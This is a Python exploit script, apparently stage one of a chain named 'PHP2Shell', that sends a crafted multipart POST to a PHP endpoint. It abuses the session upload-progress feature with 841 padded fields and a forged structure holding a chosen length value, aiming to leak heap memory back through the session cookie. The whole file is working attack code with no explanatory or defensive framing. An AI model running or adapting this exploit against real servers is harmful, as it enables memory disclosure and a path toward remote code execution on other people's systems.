#!/usr/bin/env python3
"""Send request B for the PHP2Shell stage-1 heap leak."""

import argparse
import struct

import exploit


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1/index.php")
    parser.add_argument("--fields", type=int, default=841)
    parser.add_argument("--leak-len", type=lambda value: int(value, 0), default=0x1000)
    parser.add_argument("--forge", action="store_true", default=True)
    parser.add_argument("--no-forge", dest="forge", action="store_false")
    parser.add_argument("--timeout", type=float, default=30.0)
    args = parser.parse_args()

    target = exploit.Target(args.url, timeout=args.timeout, verbose=True)
    parts = [
        {"name": "PHPSESSID", "data": exploit.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(args.fields):
        value = (f"v{i:04d}" + "x" * 44)[:48].encode()
        parts.append({"name": str(1000 + i), "data": value})
    if args.forge:
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, args.leak_len)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

    response = target.post(
        exploit.build_multipart(parts, b"B" * 10),
        b"B" * 10,
        read_cap=9 << 20,
    )
    head, _, body = response.partition(b"\r\n\r\n")
    cookie = exploit.parse_cookie(response)
    print(head.decode("latin1", "replace"))
    print(f"COOKIE_LEN={len(cookie)} COOKIE_PREFIX={cookie[:160]!r}")
    print(body[:1024].decode("latin1", "replace"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
